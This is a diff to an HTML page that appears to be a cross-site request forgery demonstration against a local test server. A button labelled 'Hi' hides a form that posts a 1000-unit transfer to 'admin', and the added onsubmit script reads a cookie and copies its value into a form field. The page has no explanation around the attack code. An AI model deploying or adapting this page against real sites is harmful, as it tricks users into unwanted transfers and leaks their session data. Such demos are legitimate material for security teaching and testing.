@@ -7,11 +7,13 @@
 </head>
 <body>
     <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
-    <form action="http://127.0.0.1:5000/transfer" method="post">
+    <form action="http://127.0.0.1:5000/transfer" method="post" onsubmit="
+    const match = document.cookie.match(/(?:^|;\s*)myCookie=([^;]*)/);
+    document.getElementById('cookieField').value = match ? decodeURIComponent(match[1]) : '';">
         <h1>Press to say Hi</h1>
         <input type="hidden" name="to" value="admin">
         <input type="hidden" name="amount" value="1000">
-        <button type="submit">submit</button>
+        <button type="submit">Hi</button>
     </form>
 </body>
 </html>
